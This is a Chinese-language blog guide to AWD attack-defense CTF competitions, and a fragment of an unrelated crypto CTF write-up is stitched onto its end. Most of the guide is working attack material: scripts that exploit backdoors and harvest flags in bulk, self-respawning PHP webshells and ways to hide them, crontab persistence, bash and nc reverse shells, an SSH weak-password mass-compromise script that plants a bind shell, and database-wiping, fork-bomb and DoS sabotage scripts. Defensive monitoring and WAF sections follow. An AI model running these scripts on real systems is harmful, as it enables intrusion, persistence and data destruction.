可以使用 seay进行代码审计 端口扫描 端口扫描是信息收集的一部分，需要知道目标服务器开放了哪些端口，使用端口扫描工具有御剑高速TCP全端口扫描工具、nmap和masscan等进行扫描。 所有服务器配置都是一样的，也可以看己方靶机开放了哪些端口。 以下是一些服务端口的漏洞： 22：ssh弱口令 873：未授权访问漏洞 3306：mysql弱口令 6379：redis未授权访问漏洞 攻击思路 主机发现 信息收集 nmap、Routescan Python 脚本 import requests for x in range(2,255): url = \"http://192.168.1.{}\".format(x) try: r = requests.post(url) print(url) except: pass 后门利用 curl读flag C:\\Users\\admin>curl \"http://192.168.182.130:8801/include/shell.php\" -d \"admin_ccmd=system('cat /f*');\" SL{4a0be463dd85555090f2216795677916d2447242} flag{glzjin_wants_a_girl_friend} 脚本 端口 #coding=utf-8 import requests url_head=\"http://192.168.182.130\" #网段 url=\"\" shell_addr=\"/upload/url/shell.php\" #木马路径 passwd=\"pass\" #木马密码 #port=\"80\" payload = {passwd: 'System(\\'cat /flag\\');'} # find / -name \"flag*\" #清空上次记录 flag=open(\"flag.txt\",\"w\") flag.close() flag=open(\"flag.txt\",\"a\") for i in range(8000,8004): url=url_head+\":\"+str(i)+shell_addr try: res=requests.post(url,payload)#,timeout=1 if res.status_code == requests.codes.ok: result = res.text print (result) flag.write(result+\"\\n\") else: print (\"shell 404\") except: print (url+\" connect shell fail\") flag.close() 一句话木马 常用语言的一句话木马 php： aspx： 蚁剑连接get型木马，之前一直不会用蚁剑连接get型木马，这里记录一下。 隐藏shell shell很容易被发现，被删除就gg了，可以采用一些操作隐藏shell或使shell无法被删除 1.把shell.php命名为.shell.php .shell.php在执行ls时无法被查看到，搭配ls的参数才能被发现 完整命令如下 [sss@ecs-centos-7 awd]$ echo \"iamshell\">shell.php [sss@ecs-centos-7 awd]$ ls shell.php [sss@ecs-centos-7 awd]$ mv shell.php .shell.php [sss@ecs-centos-7 awd]$ ls [sss@ecs-centos-7 awd]$ ls -al 总用量 12 drwxrwxr-x 2 sss sss 4096 12月 29 22:52 . drwx------ 4 sss sss 4096 12月 29 22:51 .. -rw-rw-r-- 1 sss sss 9 12月 29 22:52 .shell.php 2.把shell.php命名为-shell.php 从上面可以看出，ls加参数才能查看到shell，那么我们直接写一个-shell.php、 命令行会把-后面的内容当成参数执行，执行即使被发现，使用rm命令进行删除，会被当成是rm的参数，就会发生报错，无法删除shell，目的也达到了 完整命令如下 [sss@ecs-centos-7 awd]$ ls -shell.php [sss@ecs-centos-7 awd]$ rm -shell.php rm：无效选项 -- s Try 'rm ./-shell.php' to remove the file \"-shell.php\". Try 'rm --help' for more information. [sss@ecs-centos-7 awd]$ rm -rf -shell.php rm：无效选项 -- s Try 'rm ./-shell.php' to remove the file \"-shell.php\". Try 'rm --help' for more information. 特殊的shell shell1： 连接方式：php?2=assert密码是1。 shell2： 配置为?b=))99(rhC(tseuqeR+lave shell3： 配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs= 连接密码:0（零） shell4：MD5木马 shell5：MD5木马+利用header 2021ISCC河南赛区线下赛就是这种shell，当时差点没看出来 不死马 不死马示例： '; while (1){ file_put_contents($file,$code); system('touch -m -d \"2018-12-01 09:10:12\" shell2.php'); usleep(5000); } ?> #passwd=y0range857 #POST传参：passwd=y0range857&a=system('ls'); 将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，然后使用caidao输入http://xxx/shell2.php?pass=pass的路径，密码为a就可以链接一句话，由于pass是md5加密很难被破解也可以做到隐蔽,md5值可以随意定义。 写入shell， at.php内容 '; while (1){ file_put_contents($file,$code); system('touch -m -d \"2018-12-01 09:10:12\" .login.php'); file_put_contents($file1,$code); system('touch -m -d \"2018-12-01 09:10:12\" /admin/.register.php'); usleep(5000); } ?> 浏览器访问at.php，会生成不死马at2.php url/upload/at.php 再传入，执行命令，getshell url/upload/at2.php?passwd=obse007&at=system('ls'); 权限维持 预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少，未雨绸缪。 crontab定时任务 1.使用定时任务写马 system('echo \"* * * * * echo \\\" /var/www/html/.index.php\\n* * * * * chmod 777 /var/www/html/.index.php\" | crontab;whoami'); 密码：atkx 来指定用户运行指定的定时任务 2.使用定时任务发送带有flag的请求 bash# 编辑 crontab：crontab -e */5 * * * * curl 10.10.10.5:8000/submit_flag/ -d 'flag='$(cat /home/web/flag/flag)'&token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY' # 查询 crontab：crontab -l 3.使用定时任务反弹shell bash -c bash'bash -i >& /dev/tcp/[ip]/[port] 0>&1' nc -e /bin/bash 1.3.3.7 4444 bash 反弹shell nc反弹shell bash -i >& /dev/tcp/192.168.182.130/6666 0>&1 本地 nc -l -p 6666 软链接 软连接语法： ln -s [shell路径] [新文件路径] 使用方法： 访问/upload/new.php，实际上是访问/upload/shell.php ln -s /var/www/html/upload/shell.php /var/www/html/upload/new.php 软连接利用 root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css root@086f12c38b93:~# cat /var/www/html/css/flag.css SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0} 然后访问url/css/flag.css即可得到flag SSH弱密码利用 #-*- coding:utf-8 -*- import paramiko ip = '192.168.1.137' port = '22' username = 'root' passwd = '123456' # ssh 用户名 密码 登陆 def ssh_base_pwd(ip,port,username,passwd,cmd='cat /flag'): port = int(port) ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(hostname=ip, port=port, username=username, password=passwd) stdin,stdout,stderr = ssh.exec_command(cmd) result = stdout.read() if not result : print(\"无结果!\") result = stderr.read() ssh.close() return result.decode() a = ssh_base_pwd(ip,port,username,passwd) print(a) #SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0} 批量 #-*- coding:utf-8 -*- import paramiko import threading import queue import time #反弹shell python q=queue.Queue() #lock = threading.Lock() # ssh 用户名 密码 登陆 def ssh_base_pwd(ip,port,username,passwd,cmd): port = int(port) ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(hostname=ip, port=port, username=username, password=passwd) stdin,stdout,stderr = ssh.exec_command(cmd) result = stdout.read() if not result : result = stderr.read() ssh.close() return result.decode() def main(x): shell = ''' #服务器端 import socket import os s=socket.socket() #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.bind(('0.0.0.0',1234)) #绑定地址和端口#0.0.0.0接收任意客户端ip连接 s.listen(5) #调用listen方法开始监听端口，传入的参数为等待连接的最大数量 con,addr=s.accept() #接受一个客户端的连接 #print(con,addr) for i in range(10): cmd=con.recv(1024) print(cmd) command=cmd.decode() if command.startswith('cd'): os.chdir(command[2:].strip()) #切换路径 result=os.getcwd() #显示路径 else: result=os.popen(command).read() if result: con.send(result.encode()) else: con.send(b'OK!') ''' cmd = 'echo \\\"%s\\\" > ./shell.py' % (shell) +'&& python3 ./shell.py' port = '22' username = 'root' passwd = 'toor' ip = '192.168.1.{}'.format(x) q.put(ip.strip(),block=True, timeout=None) ip_demo=q.get() #判断是否成功 try: #lock.acquire() res = ssh_base_pwd(ip_demo,port,username,passwd,cmd='id') if res: print(\"[ + ]Ip: %s\" % ip_demo +\" is success!!! [ + ]\") #lock.release() ssh_base_pwd(ip_demo,port,username,passwd,cmd) except: print(\"[ - ]Ip: %s\" % ip_demo +\" is Failed\") if x > 255: print(\"Finshed!!!!!!!!\") q.task_done() #线程队列部分 th=[] th_num=255 for x in range(th_num): t=threading.Thread(target=main,args=(x,)) th.append(t) for x in range(th_num): th[x].start() for x in range(th_num): th[x].join() #q.join()所有任务完成 攻击搅屎 无限复制 修改数据库密码 update mysql.user set authentication_string=PASSWORD('p4rr0t');# 修改所有用户密码 flush privileges; UPDATE mysql.user SET User='aaaaaaaaaaaa' WHERE user='root'; flush privileges; delete from mysql.user ;#删除所有用户 flush privileges; 重启 apache2 和 nigix #!/usr/bin/env sh while [[ 1 ]] do service apache2 stop service nginx stop done & 循环删除 删除数据库 #!/usr/bin/env python3 import base64 def rm_db(db_user,my_db_passwd): cmd = \"/usr/bin/mysql -h localhost -u%s %s -e '\"%(db_user,my_db_passwd) db_name = ['performance_schema','mysql','flag'] for db in db_name: cmd += \"drop database %s;\"%db cmd += \"'\" return cmd fork_bomb #!/bin/sh /bin/echo '.() { .|.& } && .' > /tmp/aaa;/bin/bash /tmp/aaa; DOS脚本（非必要最好不要用） import socket import time import threading max=90000000 port=80 #端口 host=\"192.168.92.154\" #IP page=\"/index.php\" bag=(\"POST %s HTTP/1.1\\r\\n\" \"host: %s\\r\\n\" \"Content-Length: 1000000000\\r\\n\" \"Cookie: 1998\\r\\n\" \"\\r\\n\" % (page,host)) socks = [] def connect(): global socks for i in range(0,max): s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) try: s.connect((host,port)) s.send(bag.encode(\"utf-8\")) socks.append(s) except Exception as ex: time.sleep(1) def send(): global socks while True: for s in socks: try: print(\"攻击中....\") except Exception as ex: socks.remove(s) s.close() time.sleep(0.1) One = threading.Thread(target=connect,args=()) Two = threading.Thread(target=send,args=()) One.start() Two.start() 防守思路 基础查杀 寻找最近20分钟修改过的文件 find /var/www/html -name *.php -mmin -20 寻找行数最短的文件： find ./ -name '*.php' | xargs wc -l | sort -u 关键字查杀 find . -name '*.php' | xargs grep -n 'eval(' find . -name '*.php' | xargs grep -n 'assert' find . -name '*.php' | xargs grep -n 'system()' 查找命令执行函数 find /var/www/html -name \"*.php\" |xargs egrep 'assert|eval|phpinfo\\(\\)|\\(base64_decoolcode|shell_exec|passthru|file_put_contents\\(\\.\\*\\$|base64_decode\\(' 文件监控 脚本 # -*- coding: utf-8 -*- #use: python file_check.py ./ import os import hashlib import shutil import ntpath import time CWD = os.getcwd() FILE_MD5_DICT = {} # 文件MD5字典 ORIGIN_FILE_LIST = [] # 特殊文件路径字符串 Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82' bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS' logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD' webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD' difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN' Special_string = 'drops_log' # 免死金牌 UNICODE_ENCODING = \"utf-8\" INVALID_UNICODE_CHAR_FORMAT = r\"\\?%02x\" # 文件路径字典 spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str)) Special_path = { 'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)), 'log' : os.path.realpath(os.path.join(spec_base_path, logstring)), 'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)), 'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)), } def isListLike(value): return isinstance(value, (list, tuple, set)) # 获取Unicode编码 def getUnicode(value, encoding=None, noneToNull=False): if noneToNull and value is None: return NULL if isListLike(value): value = list(getUnicode(_, encoding, noneToNull) for _ in value) return value if isinstance(value, unicode): return value elif isinstance(value, basestring): while True: try: return unicode(value, encoding or UNICODE_ENCODING) except UnicodeDecodeError, ex: try: return unicode(value, UNICODE_ENCODING) except: value = value[:ex.start] + \"\".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:] else: try: return unicode(value) except UnicodeDecodeError: return unicode(str(value), errors=\"ignore\") # 目录创建 def mkdir_p(path): import errno try: os.makedirs(path) except OSError as exc: if exc.errno == errno.EEXIST and os.path.isdir(path): pass else: raise # 获取当前所有文件路径 def getfilelist(cwd): filelist = [] for root,subdirs, files in os.walk(cwd): for filepath in files: originalfile = os.path.join(root, filepath) if Special_path_str not in originalfile: filelist.append(originalfile) return filelist # 计算机文件MD5值 def calcMD5(filepath): try: with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() return hash except Exception, e: print u'[!] getmd5_error : ' + getUnicode(filepath) print getUnicode(e) try: ORIGIN_FILE_LIST.remove(filepath) FILE_MD5_DICT.pop(filepath, None) except KeyError, e: pass # 获取所有文件MD5 def getfilemd5dict(filelist = []): filemd5dict = {} for ori_file in filelist: if Special_path_str not in ori_file: md5 = calcMD5(os.path.realpath(ori_file)) if md5: filemd5dict[ori_file] = md5 return filemd5dict # 备份所有文件 def backup_file(filelist=[]): # if len(os.listdir(Special_path['bak'])) == 0: for filepath in filelist: if Special_path_str not in filepath: shutil.copy2(filepath, Special_path['bak']) if __name__ == '__main__': print u'---------start------------' for value in Special_path: mkdir_p(Special_path[value]) # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件 ORIGIN_FILE_LIST = getfilelist(CWD) FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST) backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG print u'[*] pre work end!' while True: file_list = getfilelist(CWD) # 移除新上传文件 diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST)) if len(diff_file_list) != 0: # import pdb;pdb.set_trace() for filepath in diff_file_list: try: f = open(filepath, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] webshell find : ' + getUnicode(filepath) shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt')) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filepath) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : file move error: ' + getUnicode(e) # 防止任意文件被修改,还原被修改文件 md5_dict = getfilemd5dict(ORIGIN_FILE_LIST) for filekey in md5_dict: if md5_dict[filekey] != FILE_MD5_DICT[filekey]: try: f = open(filekey, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] file had be change : ' + getUnicode(filekey) shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt')) shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filekey) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : done_diff: ' + getUnicode(filekey) pass time.sleep(2) # print '[*] ' + getUnicode(time.ctime()) 运行 python jiankong.py /var/www/html alias起别名 alias cat=\"echo nothing\" 删除 unalias -a 对方执行cat /flag命令的时候回显就是错误flag alias cat=\"echo `date`|md5sum|cut -d ' ' -f1||\" 获取 flag 一般是 curl http://xxx.com/flag.txt alias curl='echo fuckoff' #权限要求较低，可以在这里改成虚假的flag # 或者 chmod -x curl #权限要求较高 /usr/bin curl路径 杀不死马 查看进程 root@1177499f5b23:~# ps aux | grep www-data www-data 4819 0.0 0.4 315808 9016 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 6663 0.0 0.6 316188 13460 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 6675 0.0 0.3 315620 6976 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 6690 0.0 0.4 315808 9016 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 6693 0.0 0.4 315800 9056 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 7170 0.0 0.6 316312 14100 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 7239 0.0 0.6 316172 14020 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 7526 0.0 0.4 315620 8364 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 8380 0.0 0.6 316188 12612 ? S Dec16 0:00 apache2 -D FOREGROUND www-data 22554 0.0 0.3 315564 7416 ? S 03:10 0:00 apache2 -D FOREGROUND root 25353 0.0 0.0 8868 1544 pts/1 S+ 05:25 0:00 grep --color=auto www-data (1)杀进程 kill -9 对应的进程号 执行命令 ps aux | grep www-data | awk '{print $2}' | xargs kill -9 ps aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9 原理 ps aux 列出进程信息 grep www-data 在进程信息中找到需要杀死的进程 grep -v grep 在进程信息中剔除带grep的信息 awk ‘{print $2}’ 提取字符串行内容的第2个字段，也就是当前示例的进程号 xargs kill -9 将进程号作为参数传递给kill -9这个命令 然后删除不死马文件 (2)重启php等web服务，不推荐使用 service php-fpm restart (3)用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。 (4)创建一个和不死马生成的马一样名字的文件夹 mkdir 1.php 循环创建 #!/bin/bash dire=\"/var/www/html/.base.php/\" file=\"/var/www/html/.base.php\" rm -rf $file mkdir $dire ./xx.sh 清除反弹shell 查看进程 ps -ef / px -aux 出现www-data权限的/bin/sh一般为nc 然后杀进程 kill `ps -aux | grep www-data | grep apache2 | awk '{print $2}'` 提权 在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。 关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。 影响范围比较大的漏洞，可以用来提权： CVE-2017-6074 (DCCP双重释放漏洞 > 2.6.18 ) ： DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务(系统崩溃)或者提升权限，获得系统的管理访问权限 CVE-2016-5195(脏牛，kernel 2.6.22 漏洞修复 基本原则 能修复的尽量修复； 不能修复的先注释源码，不影响页面显示再删除； 站点和对应的功能尽可能不宕机； 技巧 设置 waf，如 load_file； 对于一些成型的 CMS，找到相应版本号后，对其 diff； 修改弱口令用户； 对于觉得危险函数的地方直接使用die()； 比如文件上传漏洞修复，可以在upload目录下写.htaccess禁止php文件执行 Options -ExecCGI -Indexes AllowOverride None RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml php_flag engine off deny from all 一些修复技巧参考：https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/ 日志分析 命令行动态查看日志 tailf /var/log/apache2/access.log 还可以使用工具进行日志分析：LogForensics 腾讯实验室 /web日志取证分析工具 日志的存放地址 /var/log/apache2/ /usr/local/apache2/logs /usr/nginx/logs/ 为了对其他防守方进行干扰，可以利用脚本发生大量垃圾数据包，混淆视觉，给对方人员增加检测的难度，浪费对方的时间。 import requests import time def scan_attack(): file={'shell.php','admin.php','web.php','login.php','1.php','index.php'} payload={'cat /flag','ls -al','rm -f','echo 1','echo 1 /proc/sys/net/ipv4/ip_forward','rm -rf / --no-preserve-root'} while(1): for i in range(1, 50): for ii in file: url='http://192.168.182.'+ str(i)+'/'+ii print(url) for iii in payload: data={ 'payload':iii } try: requests.post(url,data=data) print(\"正在搅屎:\"+str(i)+'|'+ii+'|'+iii) time.sleep(0.1) except Exception as e: time.sleep(0.1) pass if __name__ == '__main__': scan_attack() 流量分析 在比赛服务器上抓取流量包，需要的权限比较高，一般比赛用不到 sudo tcpdump -s 0 -w flow.pcap port 80 # 然后使用 scp 写个脚本实时将流量包拷贝到本地 tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap 命令拆解分析： 1、tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型 2、-i eth1 : 只抓经过接口eth1的包 3、-t : 不显示时间戳 4、-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包 5、-c 100 : 只抓取100个数据包 6、dst port ! 22 : 不抓取目标端口是22的数据包 7、src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24 8、-w ./target.cap : 保存成cap文件，方便用wireshark分析 PHP版流量监控 '.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter.\"\\r\\n\"; // log记录 $fh = fopen(\"log.txt\", \"a\"); fwrite($fh, $logadd); fclose($fh); ?> 一个针对php的web流量抓取、分析的应用：wupco/weblogger 使用方法 cd /var/www/html/ (or other web dir) git clone https://github.com/wupco/weblogger.git chmod -R 777 weblogger/ open http://xxxxx/weblogger/install.php in Web browser install it WAF waf的作用： 1.最重要是分析流量，别人攻击我们的时候，我们可以看到别人的攻击方式。这样的话即使我们找 不到攻击点，非常苦恼的时候，我们就可以分析流量，使用别人的攻击方式。 2.可以直接进行防御，类似于一台防火墙（一般的比赛是不允许使用的，毕竟比赛时间短，就根本绕不过去waf，那比赛就没意思了） 有些比赛是不允许上通用waf的，check机制可能会check到waf过滤的参数，导致宕机，waf部署需要谨慎，还需要注意的是：上完waf检查服务是否可用，部分检查允许使用部分小的waf，会检查页面完整性、服务完整性。 常用的waf使用方法，是用你要保护的文件去包含这个waf.php。比如说，你要保护select.php，那么你就在select.php里面写上一行include './waf.php'或者 require_once('waf.php'); 如果你要保护所有文件，那么就在config这种配置文件里包含waf，因为这种config的文件，一般会被大部分功能页面调用 网上很多waf脚本，这里介绍几个waf项目 1.AWD_PHP_WAF 项目地址：https://github.com/NonupleBroken/AWD_PHP_WAF 使用方法： 使用前先修改config.php内的密码，密码使用sha256加密 上waf： $ find . -path ./waffffff -prune -o -type f -name \"*.php\" -print | xargs sed -i \"s/比如访问 web 目录下的/waffffff/admin.php?password=123456 2.CTF-WAF 项目地址：https://github.com/sharpleung/CTF-WAF 3.awd-watchbird 这是个通防waf，支持流量转发和替换flag 项目地址：https://github.com/leohearts/awd-watchbird 1.打包好好之后直接上传到html目录下，回到终端，在上传的waf目录下，使用命令 php watchbird.php --install /var/www/html 这样就能使每个页面的php代码包含到waf下 2.运行waf 之后，打开我们的web 页面，在任意一个php 页面后面输入?watchbird=ui，就会进入到waf 配置页面然后设置密码(注意：第一次打开需要设置密码) 3.配置好之后就能进入内部网页 4.AoiAWD 项目地址：https://github.com/DasSecurity-HatLab/AoiAWD 使用方法：AoiAWD-萌新的得分利器 下载好，自己去编译或者找编译好的直接用 防御搅屎 在加固阶段，每个堡垒机都有一个Web在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有shell留在隐秘的角落... 所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用linux的防火墙进行关闭即可。 在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许22 80 21端口可以进行访问。 首先开启 22 80 21 iptables -A INPUT -p tcp --dport 80 -j ACCEPT iptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A INPUT -p tcp --dport 21 -j ACCEPT 然后关闭 iptables -A INPUT -j DROP 在手动一个个连shell搅shi的话，是非常慢的。于是写了个小脚本。 遍历整个IP段，并将防火墙开启全部屏蔽掉~~ import requests url = \"http://192.168.182\" port='80' shell = \"/shell.php\" passwd = \"a\" payloads = { passwd:\"system(\\'iptables -A INPUT -j DROP');\" } for i in range(1,254): urls = url+\".\"+str(i)+\":\"+port+shell print(urls+\"\\n\") try: res = requests.post(urls,payloads,timeout=1) print(res.text) except: print(\"未找到主机\") 编写批量脚本 以下脚本来自于我比赛时写的垃圾脚本，大佬勿喷。 1.利用后门getflag 单个shell获取flag import requests url=\"http://192.168.182.130/include/shell.php\" passwd=\"admin_ccmd\" payload = {passwd: 'system(\\'cat /f*\\');'} res=requests.post(url,payload) print(res.text) 2.后门批量getflag 针对端口变化利用后门批量获取flag import requests url1=\"http://192.168.182.130:\" url2=\"\" flaglist=[] path=\"/include/shell.php\" passwd=\"admin_ccmd\" #payload = {passwd: 'system(\\'cat /f*\\');'} payload = {passwd: 'system(\\'cat /flag\\');'} i = 0 for url2 in range(8801,8805): url = url1 + str(url2) +path res=requests.post(url,payload) try: print(url1 + str(url2),res.text) # flag存入列表中 flaglist.append(str(res.text)) #print(flaglist[i]) i += 1 except: pass 3.利用后门批量getflag并提交 burp抓包，发现flag以json形式传输 POST /api/flag HTTP/1.1 Host: 192.168.182.130:39999 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Authorization: 9ad36c305d6a2d2514434a4c10e7e13f Content-Length: 55 Origin: http://192.168.182.130:39999 Connection: close Referer: http://192.168.182.130:39999/ {\"flag\":\"SL{7a2ecc20361b7a104798b6bba6222b3972e114a2}\"} 编写脚本自动获取flag并提交 # coding: UTF-8 import requests import json url1=\"http://xxxx:\" url2=\"\" flaglist=[] path=\"/include/shell.php\" passwd=\"admin_ccmd\" flagadd=\"http://xxxx:8801/api/flag\" #提交flag的地址 #payload = {passwd: 'system(\\'cat /f*\\');'} payload = {passwd: 'system(\\'cat /flag\\');'} headers={ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', } headersflag={ 'Host': 'xxxx', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Content-Type': 'application/json;charset=utf-8', 'Authorization': 'bada82467423a6526d4d25abbe8cc43a', 'Origin': 'http://xxxx', 'Referer': 'http://xxxx/', } i = 0 for url2 in range(8802,8810): url = url1 + str(url2) +path #print(url1 + str(url2)) res=requests.post(url,payload, headers=headers) try: print(url1 + str(url2),res.text) # flag存入列表中 flaglist.append(str(res.text)) #print(flaglist[i]) body = {\"flag\": str(flaglist[i])} res = requests.post(flagadd, headers=headersflag, data=json.dumps(body)) i += 1 except: pass 如果嫌写脚本麻烦，可以把flag存入字典，利用burp爆破，也可以实现批量提交flag。不过大括号{}可能会被编码导致flag错误。 4.利用后门写shell 预留后门可能会被删除，要想持续拿分需要写shell，这里利用命令执行和代码执行来写马 利用命令执行写马 1.Linux下写shell $ echo \"\" > webshell.php $ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d > webshell.php #base64编码绕过 $ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps > webshell.php #xxd绕过 2.windows下写shell >echo ^ > webshell.php 利用代码执行写马 ?code=fputs(fopen('./webshell.php.php','w'),''); ?code=file_put_contents('webshell.php.php', ' '); ?code=file_put_contents($_POST[f], $_POST[d]); post: f=webshell.php&d= 然后利用脚本实现 # coding: UTF-8 import requests url = \"http://192.168.182.130:8808\" shell_path = url + \"/include/shell.php\" shell_passwd = \"admin_ccmd\" #利用预留后门 payload = {shell_passwd: 'system(\\'cat /f*\\');'} res = requests.post(shell_path, payload) print(res.text) #payload1利用预留后门上传shell payload1 = {shell_passwd: 'system(\\'echo \"\" > /var/www/html/atkx.php\\');'} res = requests.post(shell_path, payload1) print(\"shell已上传\") #payload2利用预留后门上传shell，并getflag my_shell_path = url + \"/atkx.php\" my_shell_passwd = \"atkx\" payload2 = {my_shell_passwd: 'system(\\'cat /f*\\');'} res = requests.post(my_shell_path, payload2) print(res.text) 批量后门写shell import requests url_head=\"http://192.168.182.130\" for url2 in range(8801,8805): try: url = url_head+\":{}\".format(url2) shell_path = url + \"/include/shell.php\" shell_passwd = \"admin_ccmd\" print(shell_path) #payload1利用预留后门上传shell payload1 = {shell_passwd: 'system(\\'echo \"\" > /var/www/html/atkx1.php\\');'} res = requests.post(shell_path, payload1) print(url + \" shell写入成功！！！！！！！\") # # #payload2通过上传的shell来getflag # my_shell_path = url + \"/atkx1.php\" # my_shell_passwd = \"atkx\" # payload2 = {my_shell_passwd: 'system(\\'cat /flag\\');'} # res = requests.post(my_shell_path, payload2) # print(url,res.text) except: pass 总结 1.预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少。 2.AWD一般使用的是cms，尽量多收集一些cms的POC和EXP，以备不时之需。 3.防守注意查看日志看别人是怎么攻击自己的，然后尝试攻击其他人，为了干扰别人，可以先打一波流量，混淆视听。 4.检查后门，保证自己的网站上没有d盾可以扫出来的后门，检查计划任务或者可疑进程。 5.比赛一轮大概几分钟，时间比较紧张，需要提高自己的代码审计能力以及自动化脚本的编写能力，实现自动化攻击。 参考文章： https://blog.csdn.net/weixin_43510203/article/details/118519120 https://www.likecs.com/show-306005446.html https://www.anquanke.com/post/id/86984 https://xz.aliyun.com/t/10995 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Crypto/backdoor.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Crypto/backdoor.html","title":"Backdoor","keywords":"","body":"题目描述 无 解题 下载附件得到源代码和代码输出，代码解释如下，： from Crypto.Util.number import * from Crypto.Util.Padding import pad from random import randint from Crypto.Util.strxor import strxor from Crypto.Cipher import AES from hashlib import sha256 from hashlib import md5 flag = b'xxx' def Get_Parameters(): w = getPrime(25) # 生成一个25位的素数w a = getPrime(15) # 生成一个15位的素数a b = getPrime(15) # 生成一个15位的素数b x = getPrime(30) # 生成一个30位的素数x return w, a, b, x def Malicious_ECDH(): w, a, b, x = Get_Parameters() # 获取参数w, a, b, x P = getPrime(512) # 生成一个512位的素数P A = getRandomNBitInteger(30) # 生成一个30位的随机整数作为曲线参数A B = getRandomNBitInteger(40) # 生成一个40位的随机整数作为曲线参数B F = GF(P) E = EllipticCurve(F, [A, B]) # 